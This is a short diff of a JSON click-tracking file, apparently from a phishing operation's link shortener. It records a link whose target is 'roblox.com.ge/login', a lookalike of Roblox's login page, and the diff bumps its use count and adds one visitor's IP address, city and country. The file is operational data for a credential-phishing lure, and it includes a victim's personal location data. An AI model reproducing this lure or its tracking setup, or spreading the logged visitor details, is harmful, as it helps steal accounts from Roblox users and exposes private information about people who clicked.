@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1039,
+    "useCount": 1040,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8432,6 +8432,14 @@
         "city": "Vracov",
         "flag": "🇨🇿",
         "countryCode": "CZ"
+      },
+      {
+        "timestamp": 1777233734861,
+        "ip": "136.32.168.206",
+        "country": "United States",
+        "city": "Olathe",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
